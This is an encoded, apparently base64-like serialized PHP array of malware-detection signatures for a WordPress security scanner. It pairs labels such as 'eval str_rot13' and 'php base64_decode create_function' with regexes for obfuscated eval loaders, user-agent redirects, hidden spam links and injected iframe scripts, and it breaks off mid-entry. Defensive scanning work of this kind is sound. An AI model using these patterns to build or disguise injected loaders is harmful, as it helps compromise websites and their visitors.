6Mjp7aTowO3M6NToiRjhURG8iO2k6MTtzOjMyNToiLyhcL1wqLio_XCpcL1xzKnxcJFthLXpfMC=5XFsnIlxdXHNdKz1ccyooWyciXSkuKj9cMjtccyopKihpZltcc1woXCFdK2Z1bmN=aW9uX2V4aXN=c1tcKFxzXSsoWyciXSkoW2Etel8wLTldKylcNFtcKVxzXStce1xzKik_KGZ1bmN=aW9uXHMrKFthLXpfMC=5XSspXChbXlwpXSpbXClcc1=rXHtbXlx9XStwYWNrXChbJyJdSFwqWyciLFxzXC4wLTlBLUZdK1tcKTtcc1=rcmV=dXJuW147XSpbO1xzXStcfVs7XHNdKyk_ZXZhbFwoKFw1XChbXlwpXSpbXCk7XHNcfV=rfFw3XChbXlwpXSpbXCk7XHNdK3xwYWNrXChbJyJdSFwqWyciLFxzXC4wLTlBLUZdK1tcKTtcc1=rKS9pcyI7fXM6NDc6InBocCBIVFRQX1VTRVJfQUdFTlQgaWYgaGVhZGVyIExvY2F=aW9uIGh=dHAgLnJ1IjthOjI6e2k6MDtzOjU6IkczMUxSIjtpOjE7czozMTA6Ii88XD9bcGhcc1=qKFwkW2Etel8wLTldKylccyo9XHMqKGFycmF5XChbXlwpXStcLnJ1WyciXVwpKztccyooXCRbYS16XzAtOV=rKVxzKj1ccypcMVxbLis7XHMqKFwkW2Etel8wLTldKylccyo9W1xzXChdKnByZWdfbWF=Y2hccyp8XCRfU=VSVkVSXFtbIiddSFRUUF9VU=VSX=FHRU5UWyciXVxdO1xzKmlmW1xzXChdK1tcJGEtel8wLTldKylcKC4qKFwzfFwxKS4qW1wpXHNce1=raGVhZGVyXChbJyJdTG9jYXRpb246XHMqKGh=dHA6XC9cLy4rXC5ydVwvLip8WyciXC5cc1=rfFwxfFwzfFw=KStcKTtbXHNkaWVcKFwpO1x9XSooXD8-XHMqfCQpL2kiO31zOjg=OiJyZXF1aXJlX29uY2Ugd3AtdXBkYXRlLnBocCBSRU1PVEVfQUREUiBIVFRQX1VTRVJfQUdFTlQgcmVxdWlyZV9vbmNlIHdwLWNsYXNzLnBocCBkaWUiO2E6Mjp7aTowO3M6NToiRjNLR3IiO2k6MTtzOjE5NjoiLzxcPy4rP3JlcXVpcmVfb25jZVtcc1woIiddK3dwLXVwZGF=ZVwucGhwWyInXCk7XHNdK1wkaXAgPSBcJF9TRVJWRVJcW1siJ11SRU1PVEVfQUREUlsiJ11cXTsuKz9cJF9TRVJWRVJcW1siJ11IVFRQX1VTRVJfQUdFTlRbIiddXF=uKz9yZXF1aXJlX29uY2VbXHNcKCInXSt3cC1jbGFzc1wucGhwWyInXCk7XHNdK2RpZVwoLis_KCR8XD8-KS9pcyI7fXM6MzY6ImV2YWwgZGVjb2RlVVJJQ29tcG9uZW5=IEVuY29kZWQtdGV4dCI7YToyOntpOjA7czo1OiJGMTE=ZyI7aToxO3M6MTE1OiIvKFwvXCpccypodHRwOlwvXC93d3cuSlNPTi5vcmdcL2pzb24yXC5qcy4rPyk_ZXZhbFtcc1woXStkZWNvZGVVUklDb21wb25lbnRbXHNcKF=rWyInXVwlW1wlMC=5YS16XStbJyJdW1wpO1xzXSs7L2lzIjt9czo4NjoiZnVuY3Rpb25zIEJETiBTVkIgU=NrIEdDayBpZiBjb29raWVFbmFibGVkIEdDayBlbHNlIFNDayBpZiBsb2FkZWQgU1ZCIGFkZEV2ZW5=TGlzdGVuZXIiO2E6Mjp7aTowO3M6NToiRUNGR1oiO2k6MTtzOjQzMDoiL2Z1bmN=aW9uIEJETlwoLis_ZnVuY3Rpb24gU1ZCXCguKz9mdW5jdGlvbiBTQ2tcKC4rP2Z1bmN=aW9uIEdDa1woLis_cmV=dXJuIHVuZXNjYXBlXChkb2N1bWVudFwuY29va2llXC5zdWJzdHJpbmdcKFteXCldK1tcKTtcc1x9XStpZltcc1woXStuYXZpZ2F=b3JcLmNvb2tpZUVuYWJsZWRbXClcc1x7XStpZltcc1woXCFdK=dDa1woW15ce1=rXHtbXH1lbHNlXHtcc1=qU=NrXChbXlwpXStbXCk7XHNdK2lmW1xzXChdK2RvY3VtZW5=XC5sb2FkZWRbXClce1xzXStTVkJcKFteXCldKltcKTtcc1x9XStlbHNlW1x7XHNdK2lmW1xzXChdK3dpbmRvd1wuYWRkRXZlbnRMaXN=ZW5lcltcKVx7XHNdK3dpbmRvd1wuYWRkRXZlbnRMaXN=ZW5lclwoW15cKV=rW1wpO1xzXH1dK2Vsc2VbXHtcc1=rd2luZG93XC5hdHRhY2hFdmVudFwoW15cKV=rW1wpO1xzXH1dKy9pcyI7fXM6MTg6ImRpdiBzdHlsZSBvcGFjaXR5MCI7YToyOntpOjA7czo1OiJGMzhJTSI7aToxO3M6OTM6Ii9ccyo8ZGl2IHN=eWxlPVsnIl1bXj5dKm9wYWNpdHlccyouXHMqMChbXlwuXXxcLlswLTFdKVtePl=qPlxzKig8YSAuKz88XC9hPlxzKikrLis_PFwvZGl2Pi9pcyI7fXM6NDQ6InBocCBlcnJvcl9yZXBvcnRpbmcgTG9uZyBtYWlsIHByaW5=X3IgU=VSVkVSIjthOjI6e2k6MDtzOjU6IkgyMk1GIjtpOjE7czozMTU6Ii88XD9bcGhcc1=qKGVycm9yX3JlcG9ydGluZ1woLns5OTk5LH18KFwkW2Etel8wLTldK1xzKj1ccyooMXxcJF8oUkVRVUVTfEdFfFBPUylUKFxzKlxbW15cXV=rXF=rKSspO1xzKikrKGlmXHMqXChbXlwpXStbXClcc1x7XStkaWVbXHNcKF=rW147XSs7W1xzXH1dKikraWZccypcKFteXCldK1tcKVxzXHtdK3doaWxlXHMqXChbXlwpXStbXClcc1x7XSspbWFpbFxzKlwoLisocHJpbnRfclwoXCRfU=VSVkVSLit8XHMqZWNoby4rXHMqXCRbYS16XzAtOVwrO1=rW1x9XHNdKikoXD8-KChccypbXFs8XWh=bWxbXF=-XSl7Mn1bXiRdKzxcL2h=bWw-KT98JCkvaSI7fXM6Njc6ImlmICFmdW5jdGlvbl9leGlzdHMgZnVuY3Rpb24gY3VybCByZXR1cm4gZnVuY3Rpb24gaW5jbHVkZSBmdW5jdGlvbnMiO2E6Mjp7aTowO3M6NToiRUNNMjQiO2k6MTtzOjI4NzoiL2lmXHMqXChccypcIWZ1bmN=aW9uX2V4aXN=c1woWyInXShbYS16XzAtOV=rKVsnIl1cKVtcKVxzXHtdKmZ1bmN=aW9uXHMqXDFcKFteXCldK1wpW1wpXHNce1=rKFteXG5dKmN1cmxfW15cbl=rXHMrKStyZXR1cm5bXlxuXStbXHMrXH1dK2Z1bmN=aW9uXHMqW2Etel8wLTldK1woW15cKV=qXClbXClcc1x7XSsoKFwkW2Etel8wLTldKylccyo9XHMqKFthLXpfMC=5XSspXChbXlxuXStccyspK2luY2x1ZGVbXChcc1=rXDQuKz9mdW5jdGlvblxzK1w1Lis_KCR8KD89ZnVuY3Rpb24gKXwoPz1cP1w-KSkvaXMiO31zOjU5OiJpZiAhY3VycmVudF91c2VyX2NhbiBhZGRfZmlsdGVyIGZ1bmN=aW9uIGEgaHJlZiBodHRwIHJldHVybiI7YToyOntpOjA7czo1OiJFQ==zUiI7aToxO3M6MjY1OiIvaWZccypcKFxzKlwhY3VycmVudF91c2VyX2NhblwoW15cKV=rW1wpXHNce1=qYWRkX2ZpbHRlcltccypcKF=rW14sXSssXHMqWyInXShbYS16XzAtOV=rKVsnIl1cKVtcKTtcc1x9XStmdW5jdGlvblxzKlwxXCguKz9hZGRfZmlsdGVyW1xzKlwoXStbXixdKyxccypbIiddKFthLXpfMC=5XSspWyciXVwpW1wpO1xzXH1dKy4rcmV=dXJuW147XSpbO1xzXH1dK2Z1bmN=aW9uXHMqXDJcKC4rPzxhIGhyZWY9WyciXWh=dHA6XC9cLy4rcmV=dXJuW147XSpbO1xzXH1dKy9pIjt9czo1OToicGhwIEFycmF5IGZ1bmN=aW9uIHJldHVybiBiYXNlNjRfZGVjb2RlIGV2YWwgRnVuY3Rpb24gQXJyYXkiO2E6Mjp7aTowO3M6NToiRUNONXQiO2k6MTtzOjE4MzoiLzxcP1twaFxzXSsoXCRbYS16XF8wLTldK1xzKj1bXjtdK1s7XHNdKykqKFwkW1wkXHtdKlthLXpcXzAtOV=rXH=qKFxzKlxbW15cXV=rXF=pKilccyo9XHMqYXJyYXkuKz9mdW5jdGlvbiAoW2EtelxfMC=5XSspLis_cmV=dXJuIGJhc2U2NF9kZWNvZGUuKz9ldmFsXChccypcNFteO1=rXDJbXjtdK1s7XHNcfVw_Pl=rL2lzIjt9czozODoicGhwIFZhciBBcnJheSBDb25jYXQgVmFyaWFibGUgRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzVON=8iO2k6MTtzOjIzNToiLzxcP1twaFxzXSsoXC9cLy4qW1xzXSspKigoXCRbYS16XzAtOV=rKVxzKj1ccyooKCdbXiddKig_PCFfZSknfCJbXiJdKiJ8XCRbYS16XzAtOV=rKVtcc1wuXSopK1teO1=qO1xzKikrPyhcQD9cJChbXCRce1=qW2Etel8wLTldK1x9KihccypcW1teXF1dK1xdKSpccyo9W1xzXEA_XCRce1=qXCQpP1tcJFx7XSpbYS16XzAtOV=rXH=qKFxzKlxbW15cXV=rXF=pKlxzKlwoW147XSs7XHMqKSsuKlxzKigkfFw_PikvaSI7fXM6NjM6InBocCBhcnJheSBpbXBsb2RlIGZ1bmN=aW9uIFZhciBIZXggcmV=dXJuIFZhcmlhYmxlRnVuY3Rpb24gZXZhbCI7YToyOntpOjA7czo1OiJFQ1BEMiI7aToxO3M6Mjg=OiIvPFw_W3BoXHNdKyhcJFthLXpcXzAtOV=rKVxzKj1ccyphcnJheVteO1=rWztcc1=rLis_KFwkW2EtelxfMC=5XSspXHMqPVxzKmltcGxvZGVbXjtdK1wxW147XStbO1xzXStmdW5jdGlvbiAoW2EtelxfMC=5XSspXChbXlwpXStbXClce1xzXSsoXCRbYS16XF8wLTldK1xzKj1bXHMnIl=rKFxceFswLTlhLWZdezJ9KStbJyJdO1xzKikrcmV=dXJuW147XSs_XCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKSpcKFteO1=rWztcfVxzXStldmFsXChcM1woXHMqXDJbXjtdK1s7XHNdKy4rPygkfFw_PikvaSI7fXM6NTg6InBocCBhcnJheSBpZiBTRVJWRVIgaWYgaXNib3QgZmlsZV9nZXRfY29udGVudHMgaGVhZGVyIGh=dHAiO2E6Mjp7aTowO3M6NToiRkFWRjkiO2k6MTtzOjI5ODoiLzxcP1twaFxzXSsoKGVycm9yX3JlcG9ydGluZ3xpbmlfc2V=KVxzKlwoW147XSo7XHMqKSooXCRbYS16XF8wLTldK1xzKj1bXjtdK1s7XHNdKykrKGlmW147XStcJGlzYm9=W147XStbO1x9XHNdKykrKC4rPyhcJFthLXpfMC=5XSspXHMqPVxzKihmaWxlX2dldF9jb25=ZW5=c3xjdXJsX2V4ZWMpXHMqXChbXlx9XStbXH1cc1=rKSsoKFwkW2EtelxfMC=5XSspXHMqPVteO1=qXDZbXjtdKls7XHNdKykqLisoKFw2fFw5KVteO1=rWztcfVxzXSsoKGhlYWRlcnxlY2hvfHByaW5=KVteO1=rWztcfVxzXSspKykrKCR8XD8-KS9pcyI7fXM6NDM6InBocCBSRVFVRVNUIGFycmF5IFJFUVVFU1QgYXJyYXlfZmlsdGVyIGV4aXQiO2E6Mjp7aTowO3M6NToiRUNRQ3AiO2k6MTtzOjE5NjoiLzxcP1twaFxzXSsoXCRbYS16XF8wLTldKylccyo9XHMqXCRfKFJFUVVFU3xHRXxQT1MpVFxbW147XStbO1xzXSsoXCRbYS16XF8wLTldKylccyo9XHMqYXJyYXlcKFwkXyhSRVFVRVN8R=V8UE9TKVRcW1teO1=rWztcc1=rXCRbYS16XF8wLTldK1xzKj1ccyphcnJheV9maWx=ZXJcKFwzWyxcc1=qXDFcKVtkZXhpdFwoXCk7XHNdKigkfFw_PikvaSI7fXM6NTA6InBocCBiYXNlNjRfZGVjb2RlIGNyZWF=ZV9mdW5jdGlvbiBWYXJpYWJsZUZpbmN=aW9uIjthOjI6e2k6MDtzOjU6IkY4Qko4IjtpOjE7czoyNTQ6Ii88XD8uKz8oXCRbYS16XzAtOV=rKVxzKj1ccypiYXNlNjRfZGVjb2RlXCguKz8oKFwkW2Etel8wLTldKylccyo9XHMqKFxAPyhnemluZmxhdGV8c3RycmV2KVwoKStcMS4rPyk_KFwkW2Etel8wLTldKylccyo9XHMqY3JlYXRlX2Z1bmN=aW9uXChbXixdK1ssXHNdKyhcMXxcMylbXjtdK1s7XHNdK1w2XChbXjtdK1s7XHNcfV=rKGVsc2VbXHtcc1=rW15cfV=rWztcc1x9XSt8ZWNob1tcc1woXSooWyciXSkuKz9cOVs7XHNcfV=rKSooJHxcPz4pL2lzIjt9czo=NzoicGhwIGZ1bmN=aW9uIHdwX2VucXVldWVfc2NyaXB=IGpzb24yIGFkZF9hY3Rpb24iO2E6Mjp7aTowO3M6NToiRkJBN1EiO2k6MTtzOjM5NToiLyhcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqKSooaWZbXHNcKFwhXStmdW5jdGlvbl9leGlzdHNcKFxzKlsnIl=oW2Etel8wLTldKylbJyJdW1xzXCldK1x7XHMqKT9mdW5jdGlvblxzKyhbYS16XzAtOV=rKVxzKlwoW15ce1=rXHtccyooKGlmW1xzXChcIV=raXNzZXRbXChcc1=rW15cKV=rW1xzXCldK1tce1xzXSopPyhcJFthLXpfMC=5XStccyo9W147XSs7XHMqKSooXCRbYS16XzAtOV=rXHMqPVxzKik_XCRbYS16XzAtOV=rXHMqXCguKj9iYXNlNjRfZGVjb2RlXCh8KGVjaG98cHJpbnQpW1xzXCgnIl=rPHNjcmlwdC4rP2Zyb21DaGFyQ29kZVwoLis_ZG9jdW1lbnRcLndyaXRlXCgpLis_YWRkX2FjdGlvblxzKlwoW1xzIiddKlteLF=rWyciXCxcc1=rKFw=fFw1KVsnIlwpO1xzXSsvaXMiO31zOjYxOiJwaHAgaWYgZnVuY3Rpb25fZXhpc3RzIGZ1bmN=aW9uIHJldHVybiBWYXJpYWJsZSBGdW5jdGlvbiBldmFsIjthOjI6e2k6MDtzOjU6IkY4RjZ3IjtpOjE7czoxOTY6Ii88XD9bcGhcc1=qKChcL1wqLis_XCpcL1xzKikqKFwkW2EtelxfMC=5XSsoXFtbXlxdXStbXF1cc1x9XSspKj1bXjtdK1s7XHNdKykrKGlmW1xzXChdK1whZnVuY3Rpb25fZXhpc3RzXChbXlx7XStbXHtcc1=rZnVuY3Rpb24gW15ce1=rW1x7XHNdKyhyZXR1cm4gXCRbYS16XF8wLTldK3xldmFsKVwoW147XStbO1x9XHNdKykrKSsoJHxcPz4pL2kiO31zOjQzOiJMZWZ=b3ZlciBIZWFkZXIgaWYgR=xPQkFMUyBIZXggU=VSVkVSIEhleC9pIjthOjI6e2k6MDtzOjU6IkYxNkRnIjtpOjE7czoxODg6Ii88XD9bcGhcc1=raWZccypcKFteXHtdK1wkR=xPQkFMU1tce1xbXVsnIl1cXHhbXlx7XStbXHtcc1=rXCRbYS16XF8wLTldKyhcW1teXF1dK1tcXVxzXH1dKykqPVteO1=rXCRfU=VSVkVSW1x7XFtdWyciXVxceFteO1=rWztcc1=raWZccypcKFteXHtdK1wkR=xPQkFMU1tce1xbXVsnIl1cXHhbXjtdK1tcc1x9O1=qKCR8XD8-KS9pIjt9czo1MzoiaWYgSFRUUF9VU=VSX=FHRU5UIGFkZF9hY3Rpb24gd3BfZm9vdGVyIGZ1bmN=aW9uIGVjaG8iO2E6Mjp7aTowO3M6NToiRjE4RkIiO2k6MTtzOjIxNToiLyhcJFthLXpcXzAtOV=rKFxbW15cXV=rW1xdXSspKlxzKj1ccypnZXRfb3B=aW9uXChbXjtdK1s7XHNdK2lmXHMqXChbXlx7XStIVFRQX1VTRVJfQUdFTlRbXlx7XStbXHtcc1=rYWRkX2FjdGlvblwoWyciXHNdK3dwX2Zvb3RlclsnIlxzLF=rKFthLXpcXzAtOV=rKVsnIlxzXStbXjtdK1s7XHNcfV=rKStmdW5jdGlvblxzK1wzW15ce1=rW1x7XHNdKyhbXlx9XStccyopK1x9L2kiO31zOjMwOiJkaXYgZGlzcGxheSBub25lIGhyZWYgaHR=cCBidXkiO2E6Mjp7aTowO3M6NToiRjNIMFYiO2k6MTtzOjEyNjoiLzwoKGRpdil8KGEpKVxzK1tePl=rKGRpc3BsYXlbXHNcOl=rbm9uZVtePl=rfCg-XHMqPChhKVxzK1tePl=qKT9ocmVmWz=nIl=raHR=cFtePl=rKXsyfT4uKj9idXkuKj9ccyo8XC8oXDN8XDY-XHMqPFwvXDIpPlxzKi9pIjt9czo4NToiQ29weXJpZ2h=IGZ1bmN=aW9uIHNldENvb2tpZSByZXR1cm4gZnVuY3Rpb24gdXNlckFnZW5=IHNldENvb2tpZSB3cml=ZSBpZnJhbWUgdG9wIE5lZyI7YToyOntpOjA7czo1OiJHQ=1EMSI7aToxO3M6NDA2OiIvKDwoc2NyaXB=KVtePl=qPlxzKik_KFwvXCpccypDb3B5cmlnaHQuK1xzKlwqXC9ccyp8W2Etel8wLTlcc1=rPVteO1=rO1xzKnxzZXRUaW1lb3V=XChbXjtdKztccyopKihmdW5jdGlvbiBbc2ddZXRDb29raWVcKC4rPygoZG9jdW1lbnRcLmNvb2tpZT18cmV=dXJuKVteXH1dK1s7XH1cc1=rKSspKy4rP1tzZ11ldENvb2tpZVwoLis_ZG9jdW1lbnRcLndyaXRlXChbIiddPChzY3JpcHR8aWZyYW1lKVtePl=rKHNyYz1bJyJcK1xzaHRwc1w6XStcL1wvfHRvcDpccypcLSkoLis_ZG9jdW1lbnRcLmNvb2tpZS4rP1wudG9VVENTdHJpbmdbXChcKVx9XSt8Lis_ZW5jb2RlVVJJQ29tcG9uZW5=XChkb2N1bWVudFwucmVmZXJyZXJcKS4rPyhbJyJdKVwvc2NyaXB=PlwxMCk_W147XStbXCk7XH1cc1=rKDxcL1wyPnwkKS9pIjt9czoxNToicGhwIExvdHMgb2YgSGV4IjthOjI6e2k6MDtzOjU6IkgxSkNzIjtpOjE7czoyODk6Ii9eKDxcP1twaFxzXSsoZnVuY3Rpb24gYmFzZTY=W15ce1=rXHtccypyZXR1cm4gYmFzZTY=W15cfV=rXH1ccyppZltcc1woXStpc3NldFtcc1woXStcJF8oUkVRVUVTfEdFfFBPUylULis8Ym9keSBvbmxvYWQ9W1xzJyJcXF=rbG9jYXRpb25bXj5dK1tePF=rPFwvYm9keT5ccyo8XC9odG1sPlxzKjxcP1twaFxzXH1dK3woLis_XFx4WzAtOUEtRl17Mn=pezUyLH1bXlxuXSspXHMqKCR8XD8-KXxcXHhFRlxceEJCXFx4QkZccyo8XCFET=NUWVBFLis_ZXZhbFwoLis8XC9ib2R5PlxzKjxcL2h=bWw-XHMqJCkvaXMiO31zOjYxOiJzY3JpcHQgZG9jdW1lbnQgd3JpdGUgZGl2IGFuY2hvciBzY3JpcHQgZG9jdW1lbnQgd3JpdGUgRU5EZGl2IjthOjI6e2k6MDtzOjU6IkdCUjhLIjtpOjE7czoxODY6Ii88c2NyaXB=W14-XSo-XHMqZG9jdW1lbnRcLndyaXRlXChbIiddKFtcPGRpdl1bIicgXCtdKil7NH1bXj5dKj5bIiddXCk7XHMqPFwvc2NyaXB=PlxzKig8YSAuKz88XC9hPlxzKikrPHNjcmlwdFtePl=qPlxzKmRvY3VtZW5=XC53cml=ZVwoWyInXShbXDxcL2Rpdl1bIicgXCtdKil7NX=-WyInXVwpO1xzKjxcL3NjcmlwdD4vaSI7fXM6NDM6ImVjaG8gZGl2IHBvc2l=aW9uIGFic29sdXRlIG5lZ2F=aXZlIGFuY2hvcnMiO2E6Mjp7aTowO3M6NToiSDE1OVkiO2k6MTtzOjM3MToiLyg_PCFbJyJdKTwoaHRtbD4pP1tcczxdKigoKHNjcmlwdClbXj5dKj5ccypkb2N1bWVudFwud3JpdGVbXChccyciXSs8KT9kaXZ8KHN=eWxlKVtePl=qPlxzKltcLlwjXShbYS16X1wtMC=5XSspW1xzXHtdKykoW15cfVw-XSoobGVmdHxwb3NpdGlvbnx=b3B8b3BhY2l=eXxmaWx=ZXJ8ZGlzcGxheXx=ZXh=LWluZGVudClcOlxzKihhbHBoYVwob3BhY2l=eT=wfDA_XC58XC1bMC=5XC5dezMsfXxub25lfGFic29sdXRlKSl7Myx9W14-XSo-WyciXCk7XHNdKig8XC9cNT4pPy4qPzwoKChbYi1zXVthLXowLTldKilbXj5dKj5bLlxzXSo8KSphIC4rPzxcL2EoPltePF=qPChcLyhbXmRdW2EtejAtOV=qfFwxNCkpPykqKSs-KFxzKjxcLyhcMnxkaXY-KSkqL2kiO31zOjQxOiJQSFAgR2FyYmFnZSBBcm91bmQgZXZhbCBWYXJpYWJsZSBGdW5jdGlvbiI7YToyOntpOjA7czo1OiJGMkNKZCI7aToxO3M6MTUxOiIvPFw_W3BoXHNdK1wkW2EtelxfMC=5XStccyo9KFxzKicuKydbXClcLl=rKSsoXHMqJy4rZXZhbFxzKlwoXCRbXCRce1=qW2EtelxfMC=5XStbXH=gXHRdKihcW1teXF1dK1xdWyBcdF=qKSpcKC4rJ1tcKVwuXSspKFxzKicuKydbXC47XCldKykrXHMqKFw_PnwkKS9pIjt9czo3Njoic3RyaXBzbGFzaGVzIFJFUVVFU1QgaWYgZWNobyByZXR1cm4gZm9wZW4gZndyaXRlIGZjbG9zZSBlY2hvIGZ1bmN=aW9uIHJldHVybiI7YToyOntpOjA7czo1OiJGMkU2ZCI7aToxO3M6MzEyOiIvKFx4RUZceEJCXHhCRik_PFw_W3BoXHNdKyhcJFthLXpcXzAtOV=rXHMqPVxzKihzdHJpcHNsYXNoZXNbXChcc1=rKT9cJF8oUkVRVUVTfEdFfFBPUylUXFtbIiddW147XSpbO1xzXSspKyhpZltcKFxzXStcJFteXHtdKltce1xzXStlY2hvXHMqWyInXVteO1=rWztcc1=rcmV=dXJuW147XSo7W1xzXH1dKykrLis_Zm9wZW5cKC4rP2Z3cml=ZVwoLis_ZmNsb3NlXChbXjtdKls7XHNdK2VjaG9ccypbIiddW147XStbO1xzXSsoZnVuY3Rpb24uKz9bcm1rXXsyfWRpclwoW147XSs7W1xzXH1dKyhyZXR1cm5bXjtdKjtbXHNcfV=rKSopKygkfFw_PikvaXMiO31zOjI1OiJWYXIgSGV4IFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkdDU=FnIjtpOjE7czoxOTI6Ii8oKChcJFthLXpfMC=5XHNcLl=rPVteO1=rO1xzKikqXCRbYS16XzAtOVxzXC5dKz=oW147XSpcXFt4MC=5YS1mXXsyLDN9KStbXjtdKjtccyopKykrKGlmXHMqXChbXlx7XStce1xzKik_KChcJFthLXpfMC=5XStccyo9XHMqKT9cQD9cJFthLXpfMC=5XSsoXHMqXFtbXlxdXStcXSkqXChbXjtdKztccyopK1tcfVxzXSooXC9cLy4rKT8vaSI7fXM6ODk6ImluaV9zZXQgaWYgaXNzZXQgYXJyYXkgYmFzZTY=X2RlY29kZSBmdW5jdGlvbiByZXR1cm4gYmFzZTY=X2RlY29kZSBldmFsIFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc=UkxRIjtpOjE7czozNTA6Ii88XD9bcGhcc1=rKFtpZlxzXChcIVxAXSooaW5pX3NldFxzKlwofGVycm9yX3JlcG9ydGluZ1xzKlwofHNldF9=aW1lX2xpbWl=XHMqXCh8aXNzZXRccypcKHxkZWZpbmV8Z2xvYmFsfFwkW1x7XCRhLXpfMC=5XH1cW1xcJyJcXVxzXSs9KVteO1=rO1tcfVxzXSopKyhmdW5jdGlvblxzKihbYS16XzAtOV=rKVxzKlwoLis_KHJldHVyblxzKihcNHxiYXNlNjRfZGVjb2RlKXxcJFthLXpfMC=5XStccyooXFtbXlxdXSpcXVxzKikqKVwoLis_KSsoPzwhXC9cLyxmdW5jdGlvblwocmVzcG9uc2VcKSBceyApZXZhbFwoLis_XCkrO1tcc1x9O1=rKFw_PlxzKihcI1whW1wvYS16X1wtMC=5XCs9XHNdezIwMCx9JCk_fCQpL2lzIjt9czo=NjoiY2xhc3MgY29uc3QgcGFjayBIKiBmdW5jdGlvbiBpbmNsdWRlIG5ldyBDbGFzcyI7YToyOntpOjA7czo1OiJGNVE5RyI7aToxO3M6MTkyOiIvY2xhc3NccysoW2Etel8wLTldKylccypcey4rP2NvbnN=XHMrKFthLXpfMC=5XSspXHMqPS4rP3NlbGZcOlw6KFthLXpfMC=5XSspXChwYWNrXCgnSFwqJ1ssXHNdK3NlbGZcOlw6XDJcKSsuKz9mdW5jdGlvblxzK1wzXCgoXCRbYS16XzAtOV=rKS4rP1xAPyhpbmNsdWRlfHJlcXVpcmUpKF9vbmNlKT9bXjtdK1w=LituZXdccytcMTsvaXMiO31zOjE=OiJldmFsIHN=cl9yb3QxMyI7YToyOntpOjA7czo1OiJGOVBDbCI7aToxO3M6MTU5OiIvKFwvXC8uKyk_XHMqKChpbmlfc2V=XCh8ZXJyb3JfcmVwb3J=aW5nXCh8XCRbYS16XzAtOV=rW1xzXC5dKj=pW147XSo7XHMqKSpcQD8oZXZhbHxhc3NlcnR8XCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKSopXHMqXChccypzdHJfcm9=MTNcKCcuKidcKVwpOyhccypcMSk_L2kiO31zOjMyOiJwaHAgR=xPQkFMUyBIZXggZnVuY3Rpb24gaWYgZXZhbCI7YToyOntpOjA7czo1OiJHNkdBaiI7aToxO3M6NjAyOiIvPFw_W3BoXHNdKihccypcJChHTE9CQUxTfFtce1wkJyJdK1swLTlfXC1hLXpcXCciXC5dK1tcfVxzXSspW1xzXFtceyciXSsoW2Etel8wLTldKylbIidcfVxdXHNdKyhbXjtdKjtccypnbG9iYWxccypcJFwzW147XSo7XHMqXCRcM1xzKj1ccypcJEdMT=JBTFNbXjtdKjtccypcJChcM3xce1teXH1dKlx9KylccyooXFtbXlxdXStbXF1cc1=rfFx7W15cfV=rW1x9XHNdKykrKT89XHMqWyciXShcXHhbMC=5YS1mXXsxLDJ9KStbIiddO1xzKigoZWNob3xwcmludCk_W1xzXEBdKlwkKEdMT=JBTHxcMylbXjtdKztccyp8XCRbYS16XzAtOV=rXHMqKFtcLj1dK1xzKlxAPyhOVUxMfChhcnJheVtcKFxzXSspP1wkKEdMT=JBTHxcMylbXjtdKnxcJFthLXpfMC=5XSsoXFtbXlxdXStbXF1cc1=rfFx7W15cfV=rW1x9XHNdKykqfFsiJ1=rKSkrO1xzKnxnbG9iYWxccypcJFteO1=rO1xzKnxmdW5jdGlvblxzK1swLTlfYS16XStccypcKFteXHtdK3xce1xzKnxcfVxzKnwoZm9yKGVhY2gpP3woZWxzZVxzKik_aWYpXHMqXCguKz9cKStccyp8cmV=dXJuW147XSo7W1xzXH1dKyl7MzAsfSkrZXZhbFwoLis_XCkrO1tcc1x9XSsoZXhpdFteO1=qO1tcc1x9XSspPygkfFw_PikvaSI7fXM6MzY6InBocCBpZiBpc3NldCBQT1NUIGJhc2U2NF9kZWNvZGUgbWFpbCI7YToyOntpOjA7czo1OiJHQ1VLbSI7aToxO3M6NDY4OiIvPFw_W3BoXHNdKigoXCQoWzAtOV9hLXpdKylccyo9XHMqZXhwbG9kZVteLF=rLFxzKmJhc2U2NF9kZWNvZGVcKFteO1=rO1xzKnwoKGlmfGlzc2V=fGZvcmVhY2gpXHMqXCgpK1wkXyhSRVFVRVN8R=V8UE9TKVRbXlwpXStbXClcc1x7XSspPyhcJFswLTlfYS16XStbXHNcLl=qPVxzKlthLXpfMC=5XHNcKF=qXCQoXDN8X1JFUVVFU1R8X=dFVHxfUE9TVCkoW147XSpbXCk7XH1cc1=rZWxzZVtce1xzXSp8ZWNob3xwcmludCkqW147XSpbO1xzXSsoXHMqZXhpdDspP3xcL1wvLitccyopW1x9XHNdKikrKFwkWzAtOV9hLXpdK1tcc1wuXSo9XHMqIi4rP1xcclxcbiI7XHMqKSooKFwkW2Etel8wLTldK1xzKj1ccyp8aWZbXHNcKF=rfGVsc2VbXlx7XSpbXHtcc1=rKSptYWlsXHMqXChbXjtdK1tcKTtcc1x9XSooKGlmW1woXHNdK3xlbHNlKVteXHtdKltce1xzXStlY2hvW147XSpbO1xzXH1dK3xleGl=O1xzKikqKSsoJHxcPz4pL2kiO31zOjMwOiJ3cF9lbnF1ZXVlX3NjcmlwdCBTV=VFVENBUFRDSEEiO2E6Mjp7aTowO3M6NToiRjZVR2wiO2k6MTtzOjYwOiIvd3BfZW5xdWV1ZV9zY3JpcHRcKFteLF=rLFxzKlsnIl1odHRwLis_U1dFRVRDQVBUQ=hBW147XSs7L2kiO31zOjM4OiJwaHAgY2xhc3MgVmFyaWFibGUgRnVuY3Rpb25zIG5ldyBDTEFTUyI7YToyOntpOjA7czo1OiJHOVJCRSI7aToxO3M6MzIwOiIvPFw_W3BoXHNdKyhcL1wqLio_XCpcL1xzKnxlcnJvcl9yZXBvcnRpbmdcKDBcKTtccyp8ZnVuY3Rpb25bXlwoXStkb2xseVteXHtdK1x7Lio_KHJldHVybnxkYkRlbHRhKVteO1=qWztcfVxzXSopKmNsYXNzXHMrKFthLXpfMC=5XSspXHMqXHsuKz8oKFwkW2Etel8wLTlceyciXH1dKyhccypcW1teXF1dK1xdKSpccyo9XHMqKT8oXCRbYS16XzAtOVx7XH1dKyhccypcW1teXF1dK1xdKSp8YmFzZTY=X2RlY29kZVwocmF3dXJsZGVjb2RlfGZpbGVfcHV=X2NvbnRlbnRzKVxzKlwoLio_W1wpXHNdKztccyopezMsfS4rP25ld1xzK1wzW147XSo7XHMqKCR8XD8-KS9pcyI7fXM6MTQ6InZpc2l=b3JUcmFja2VyIjthOjI